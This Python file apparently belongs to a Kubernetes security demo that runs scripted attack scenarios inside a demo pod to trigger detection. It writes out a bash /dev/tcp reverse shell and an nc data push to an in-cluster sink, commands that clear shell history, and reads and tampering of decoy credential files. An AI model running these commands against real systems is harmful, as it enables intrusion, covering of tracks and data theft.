from __future__ import annotations

import logging
from datetime import datetime, timezone
from typing import Any

from kubernetes import client, config
from kubernetes.client.rest import ApiException
from kubernetes.stream import stream

from .config import Settings
from .models import SCENARIO_LABELS, ScenarioResult

logger = logging.getLogger(__name__)

ALLOWED_SCENARIOS = frozenset(
    {
        "discovery",
        "reverse-shell",
        "shell-history",
        "decoy-modify",
        "network-burst",
        "compute-simulation",
    }
)


class ScenarioController:
    def __init__(self, settings: Settings) -> None:
        self.settings = settings
        try:
            config.load_incluster_config()
        except config.ConfigException:
            config.load_kube_config()
        self.core = client.CoreV1Api()
        self._active_scenario: str | None = None

    @property
    def active_scenario(self) -> str | None:
        return self._active_scenario

    def _workload_pod_name(self) -> str:
        pods = self.core.list_namespaced_pod(
            namespace=self.settings.namespace,
            label_selector=f"app={self.settings.workload_name}",
        ).items
        for pod in pods:
            if pod.status and pod.status.phase in {"Running", "Pending"}:
                return pod.metadata.name
        raise RuntimeError("demo workload pod not found")

    def _sink_ip(self) -> str:
        pods = self.core.list_namespaced_pod(
            namespace=self.settings.namespace,
            label_selector=f"app={self.settings.sink_name}",
        ).items
        for pod in pods:
            if pod.status and pod.status.pod_ip:
                return pod.status.pod_ip
        raise RuntimeError("scenario sink pod has no IP")

    def _exec(self, command: list[str]) -> str:
        pod_name = self._workload_pod_name()
        resp = stream(
            self.core.connect_get_namespaced_pod_exec,
            pod_name,
            self.settings.namespace,
            command=command,
            stderr=True,
            stdin=False,
            stdout=True,
            tty=False,
            _preload_content=False,
        )
        output = ""
        while resp.is_open():
            resp.update(timeout=30)
            if resp.peek_stdout():
                output += resp.read_stdout()
            if resp.peek_stderr():
                output += resp.read_stderr()
        resp.close()
        if resp.returncode not in (0, None):
            logger.warning("exec returned %s: %s", resp.returncode, output)
        return output

    def _script_for(self, scenario_id: str, sink_ip: str) -> list[str]:
        port = str(self.settings.sink_port)
        if scenario_id == "discovery":
            return [
                "/bin/bash",
                "-lc",
                (
                    "id; uname -a; ps aux | head -20; "
                    "echo '--- decoys ---'; "
                    "cat /decoys/credentials.txt; "
                    "cat /decoys/runbook.txt; "
                    "ls -la /decoys"
                ),
            ]
        if scenario_id == "reverse-shell":
            return [
                "/bin/bash",
                "-lc",
                (
                    f"timeout 8 bash -c 'bash -i >& /dev/tcp/{sink_ip}/{port} 0>&1' "
                    "|| true"
                ),
            ]
        if scenario_id == "shell-history":
            return [
                "/bin/bash",
                "-lc",
                "set +o history; export HISTFILE=/dev/null; history -c; history -w; echo cleared",
            ]
        if scenario_id == "decoy-modify":
            return [
                "/bin/bash",
                "-lc",
                "echo 'tampered-by-demo' >> /decoys/credentials.txt && cat /decoys/credentials.txt",
            ]
        if scenario_id == "network-burst":
            return [
                "/bin/bash",
                "-lc",
                f"dd if=/dev/zero bs=1M count=5 2>/dev/null | nc -w 3 {sink_ip} {port} || true",
            ]
        if scenario_id == "compute-simulation":
            return [
                "/bin/bash",
                "-lc",
                "for i in $(seq 1 5000); do echo $((i*i)) >/dev/null; done; echo compute-done",
            ]
        raise ValueError(f"unsupported scenario: {scenario_id}")

    def run(self, scenario_id: str) -> ScenarioResult:
        if scenario_id not in ALLOWED_SCENARIOS:
            raise ValueError(f"scenario {scenario_id} is not allowlisted")
        started = datetime.now(timezone.utc).isoformat()
        self._active_scenario = scenario_id
        try:
            sink_ip = self._sink_ip()
            output = self._exec(self._script_for(scenario_id, sink_ip))
            return ScenarioResult(
                scenario_id=scenario_id,
                status="started",
                message=output.strip() or SCENARIO_LABELS.get(scenario_id, scenario_id),
                started_at=started,
            )
        finally:
            self._active_scenario = None
